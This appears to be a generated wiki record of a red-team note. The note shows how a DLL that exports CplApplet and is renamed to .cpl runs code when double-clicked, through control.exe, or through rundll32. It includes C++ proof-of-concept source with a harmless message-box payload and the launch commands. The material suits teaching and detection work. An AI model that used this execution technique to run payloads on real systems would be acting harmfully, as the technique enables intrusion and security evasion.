---
parsed_by: focuslocust
source: redteamingtactics
type: generated
---
# Executing Code as a Control Panel Item through an Exported Cplapplet Function

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `redteamingtactics` |
| Type | `redteaming-topic` |
| Record ID | `rtt-offensive-security-code-execution-executing-code-in-control-panel-item-through-an-exported-cplapplet-function` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/redteaming-tactics-and-techniques/offensive-security/code-execution/executing-code-in-control-panel-item-through-an-exported-cplapplet-function.md` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Summary

This is a quick note that shows how to execute code in a .cpl file, which is a regular DLL file representing a Control Panel item.

## Preserved Body

````markdown
This is a quick note that shows how to execute code in a .cpl file, which is a regular DLL file representing a Control Panel item.

The .cpl file needs to export a function `CplApplet` in order to be recognized by Windows as a Control Panel item.

Once the DLL is compiled and renamed to .CPL, it can simply be double clicked and executed like a regular Windows .exe file.

## Code
```cpp
// dllmain.cpp : Defines the entry point for the DLL application.
#include "stdafx.h"
#include <Windows.h>

//Cplapplet
extern "C" __declspec(dllexport) LONG Cplapplet(
	HWND hwndCpl,
	UINT msg,
	LPARAM lParam1,
	LPARAM lParam2
)
{
	MessageBoxA(NULL, "Hey there, I am now your control panel item you know.", "Control Panel", 0);
	return 1;
}

BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
	{
		Cplapplet(NULL, NULL, NULL, NULL);
	}
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}
```
Once the DLL is compiled, we can see our exported function `Cplapplet`:

![](<../../_assets/image (200).png>)

## Demo

Below shows that double-clicking the .cpl item is enough to launch it:

![](<../../_assets/cplexecution.gif>)

![](<../../_assets/image (204).png>)

CPL file can also be launched with `control.exe <pathtothe.cpl>` like so:

![](<../../_assets/image (202).png>)

or with rundll32:
```
rundll32 shell32, Control_RunDLL \\VBOXSVR\Experiments\cpldoubleclick
\cpldoubleclick\Debug\cpldoubleclick.cpl
```
![](<../../_assets/image (203).png>)

## References
````

## Source Verification

[source record](../../sources/redteamingtactics/executing-code-as-a-control-panel-item-through-an-exported-cplapplet-function.md)

## Evidence Excerpt

```text
_asset_filenames:
- cplexecution.gif
- image (200).png
- image (202).png
- image (203).png
- image (204).png
_body: "# Executing Code as a Control Panel Item through an Exported Cplapplet Function\n\nThis is a quick note that shows\
\ how to execute code in a .cpl file, which is a regular DLL file representing a Control Panel item.\n\nThe .cpl file needs\
```
